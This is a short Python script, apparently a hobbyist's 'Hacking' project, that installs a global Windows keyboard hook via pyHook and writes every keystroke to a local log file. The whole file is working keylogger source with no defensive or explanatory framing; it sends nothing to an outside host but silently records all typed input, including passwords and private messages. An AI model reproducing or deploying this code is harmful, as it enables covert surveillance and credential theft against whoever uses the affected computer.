import pyHook
import pythoncom
import sys
import logging
import os
file_log = "F:\git\Python\Hacking\log.txt"
# file_log = os.path.join("f:\git\Python\Hacking", "log.txt")
print(file_log)

logger = None

# %(asctime)s -  %(name)s -


def init():
    logger = logging.getLogger()
    logger.setLevel(logging.DEBUG)
    handler = logging.FileHandler(file_log, "w", encoding=None)
    formatter = logging.Formatter(
        "%(levelname)s - %(message)s")
    handler.setFormatter(formatter)
    logger.addHandler(handler)


def on_key_press(event):
    key = chr(event.Ascii)
    print("Key: ", chr(event.Ascii))
    # logging.log(10, key)
    logging.debug(key)
    return True
init()
hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = on_key_press
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
